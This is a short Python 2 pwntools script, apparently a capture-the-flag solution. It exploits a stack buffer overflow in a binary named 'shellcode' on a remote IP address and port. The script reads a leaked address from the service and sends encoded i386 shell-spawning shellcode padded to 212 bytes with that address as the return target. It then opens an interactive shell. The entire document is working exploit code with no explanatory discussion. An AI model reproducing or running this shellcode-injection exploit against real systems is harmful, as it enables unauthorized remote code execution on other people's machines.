#!/usr/bin/env python2
from pwn import *

# Padding and shellcode
before = b"a"*212
shellcode = encoders.encoder.line(asm(shellcraft.i386.linux.sh()))

# Spawn and attach to process or remote
#p = process('./shellcode')         # LOCAL
p = remote('207.154.215.146', 1337) # REMOTE

# Read and extract address
addrline = p.recvline()
addr = int(addrline[addrline.find('0x'):].strip(), 16)

# Create payload
payload = shellcode + before[len(shellcode):] + p32(addr)

# Send payload and run shell
p.sendline(payload)
p.interactive()
